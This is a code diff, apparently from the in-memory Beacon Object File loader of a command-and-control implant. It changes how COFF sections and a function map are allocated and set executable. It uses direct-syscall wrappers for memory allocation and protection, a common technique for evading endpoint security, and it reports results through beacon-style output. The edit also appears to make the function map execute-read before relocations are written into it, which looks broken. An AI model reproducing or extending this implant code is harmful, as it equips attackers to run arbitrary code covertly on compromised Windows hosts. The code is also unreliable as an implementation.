@@ -158,8 +158,7 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
 {
 	for (int i = 0; i < pHeader->NumberOfSections; i++) {
 		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
-		SIZE_T sz = pSection->SizeOfRawData;
-		NtAllocateVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapSections[i], 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+		mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
 		if (!mapSections[i] && pSection->SizeOfRawData)
 			return FALSE;
 		
@@ -168,17 +167,15 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
 		else 
 			memset(mapSections[i], 0, pSection->SizeOfRawData);
 	}
-
 	for (int i = 0; i < pHeader->NumberOfSections; i++) {
-		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
-		if (mapSections[i] && pSection->SizeOfRawData) {
+		COF_SECTION* pSec = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
+		if (mapSections[i] && pSec->SizeOfRawData) {
 			PVOID pBase = mapSections[i];
-			SIZE_T sz = pSection->SizeOfRawData;
+			SIZE_T sz = pSec->SizeOfRawData;
 			ULONG oldProt;
 			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_EXECUTE_READ, &oldProt);
 		}
 	}
-
 	return TRUE;
 }
 
@@ -325,6 +322,7 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
 	LPVOID* mapFunctions       = NULL;
 	BOOL  result			 = FALSE;
 	PCHAR mapSections[MAX_SECTIONS] = { 0 };
+	SIZE_T szMf = 0;
 
 	InitBofOutputData();
 	bofTaskId = taskId;
@@ -348,14 +346,19 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
 		goto RET;
 	}
 
-	SIZE_T sz = MAP_FUNCTIONS_SIZE;
-	NtAllocateVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	szMf = MAP_FUNCTIONS_SIZE;
+	mapFunctions = NULL;
+	NtAllocateVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, 0, &szMf, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (mapFunctions) {
+		PVOID pBase = mapFunctions;
+		SIZE_T sz = MAP_FUNCTIONS_SIZE;
+		ULONG oldProt;
+		NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_EXECUTE_READ, &oldProt);
+	}
 	if (!mapFunctions) {
 		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
 		goto RET;
 	}
-	ULONG oldProt;
-	NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, &sz, PAGE_EXECUTE_READ, &oldProt);
 
 	result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, mapFunctions);
 	if (!result) {
@@ -367,8 +370,8 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
 
 RET:
 	if (mapFunctions) {
-		SIZE_T szFree = 0;
-		NtFreeVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, &szFree, MEM_RELEASE);
+		SIZE_T sz = 0;
+		NtFreeVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, &sz, MEM_RELEASE);
 		mapFunctions = NULL;
 	}
 
